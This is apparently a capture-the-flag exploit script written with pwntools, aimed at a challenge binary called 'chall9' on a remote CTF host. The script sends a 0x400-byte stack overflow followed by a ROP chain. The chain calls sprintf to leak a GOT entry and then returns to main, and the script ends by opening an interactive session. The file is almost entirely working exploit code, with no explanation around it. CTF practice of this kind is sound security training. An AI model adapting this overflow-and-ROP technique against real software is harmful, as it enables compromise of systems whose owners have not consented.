#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall9')
context(terminal=['tmux','new-window'])

host = args.HOST or 'challenge.pwny.racing'
port = int(args.PORT or 40009)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x00400e6b
'''
# gdbscript = '''
# b *0x00400da4
# b *0x00400dfe
# '''

# -- Exploit goes here --

io = start()

buf = b'a'*0x400+b'\x18'
rop = ROP(exe)
rop.call('sprintf',[0x4015cc,exe.got['sprintf']])
main = 0x00400c73
rop.call(main)
buf += rop.chain()

io.sendline(buf)

# print(io.recvall().decode())
io.interactive()

